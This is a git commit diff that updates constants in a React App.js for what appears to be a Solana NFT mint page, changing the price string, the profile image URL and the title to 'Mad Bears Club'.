f06dca85ac1cf8edcfd384ae7bbc9a7b86acf039
SDEEY <75689630+SDEEY@users.noreply.github.com>
2023-04-23 22:52:04 +0500

    Update App.js

--- src/App.js
+++ src/App.js
@@ -6,9 +6,9 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = '0'
-const image = 'https://pbs.twimg.com/profile_images/1635424650879549446/8JLDQ6Am_400x400.jpg'
-const Title = 'keizers'
+const solAmount = '0.3 / 0.4 / 0.5'
+const image = 'https://pbs.twimg.com/profile_images/1635779783463141376/FIRtcFsE_400x400.jpg'
+const Title = 'Mad Bears Club'
 const supply = 108
 
 document.title = Title
